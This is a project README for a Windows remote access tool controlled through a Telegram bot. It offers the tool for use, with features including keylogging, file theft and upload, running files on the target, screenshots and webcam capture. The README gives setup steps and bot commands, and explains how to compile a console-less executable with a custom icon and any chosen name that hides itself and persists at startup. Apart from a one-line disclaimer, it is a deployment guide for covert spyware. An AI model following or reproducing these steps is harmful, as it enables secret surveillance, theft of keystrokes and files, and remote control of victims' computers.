# RAT-via-Telegram

Windows Remote Administration Tool via Telegram

### Why another one?

- The current Remote Administration Tools in the market face 2 major problems:

    - Lack of encryption.
    - Require port forwarding in order to control from hundreds of miles.

- This RAT overcomes both these issues by using the Telegram bot API.

    - Fully encrypted. The data being exchanged cannot be spied upon using MITM tools.
    - Telegram messenger app provides a simple way to communicate to the target without configuring port forward before hand on the target.

## Features:

- Run keylogger on the target PC.
- Get target PC's Windows version, processor and more.
- Get target PC's IP address information and approximate location on map.
- List any directories on the target.
- Download any file locally from the target PC in the background.
- Upload local files on to the target PC. Send your image, pdf, exe or anything as `file` to the Telegram bot.
- Screenshots of the target PC.
- [WIP] Take snapshots from the webcam (if attached).
- Execute any file on the target PC.
- Self-Destruct RAT on the target PC.
- More coming soon!

## Screenshots:

<img src="http://i.imgur.com/surSaEm.png" width="290"><img src="http://i.imgur.com/4pL4RJM.png" width="290"><img src="http://i.imgur.com/b77UVxL.png" width="290">

## Installation & Usage:

- Clone this repository.
- Set up a new Telegram bot talking to the `BotFather`.
- Copy this token and replace it in the beginning of the script.
- Install the dependencies: `pip install -r requirements.txt`.
- Install pyHook `64-bit` or `32-bit` depending on your system.
    - For 64-bit- `pip install pyHook-1.5.1-cp27-cp27m-win_amd64.whl`.
    - For 32-bit- `pip install pyHook-1.5.1-cp27-cp27m-win32.whl`.
- To run the script: `python RATAttack.py`.
- Find your bot on telegram and send some command to the bot to test it.
- To restrict the bot so that it responds only to you, note down your `chat_id` from the console and replace it in the script and comment out the line `return True`. Don't worry, you'll know when you read the comments in the script.
<img src="http://i.imgur.com/XKARtrp.png">
- A folder named `RATAttack` will be created in your working directory containing `keylogs.txt` and any files you upload to the bot.

### Commands:

When using the below commands; use `/` as a prefix. For example: `/pc_info`.

```
pc_info - PC information
msg_box - display message box with text
snapshot - take picture with webcam
ip_info - via ipinfo.io
download_file - download file from target
list_dir - list contents of directory
run_file - run a file on target
capture_pc - screenshot PC
keylogs - get keylogs
self_destruct - destroy all traces from target PC
```

You can copy the above to update your command list via `BotFather` so you don't have to type them manually.

## Compiling:

### How To Compile:

- Go to `C:\Python27\Scripts\` or wherever you installed python.
- Run `pyinstaller --onefile --noconsole C:\path\to\RATAttack.py`. You can also pass `--icon=<path\to\icon.ico>` to use any custom icon.
- Once it is compiled successfully, find the `.exe` file in `C:\Python27\Scripts\dist\`. You can change the name of the `.exe` to anything you wish.
- **BEWARE!** If you run the compiled `.exe`, the script will hide itself and infect your PC to run at startup. You can return to normal by using the `/self_destruct` option or manually removing `C:\Windows\Portal\` directory and `C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\portal.lnk`.

### Modifying Settings:

- You can also modify the name of hidden `.exe` file and location and name of the folder where the hidden `.exe` will hide itself. To do this; modify `hide_folder` and `compiled_name` respectively.

## Notes:

- Currently only Python2 is supported. Python3 support will be added soon!
- `/msg_box` is still in beta and may not work properly.
- Keylogger may detect some keys improperly. Like pressing `shift+/` results in recording `/` instead of `?`.

## Contributing:

- This project is still in very early stages, so you can expect some bugs. Please feel free to report them! Even better, send a pull request :)
- Any new features and ideas are most welcome!

## Disclaimer:

**This tool is supposed to be used only on authorized systems. Any unauthorized use of this tool without explicit permission is illegal.**

## License:

`The MIT License`
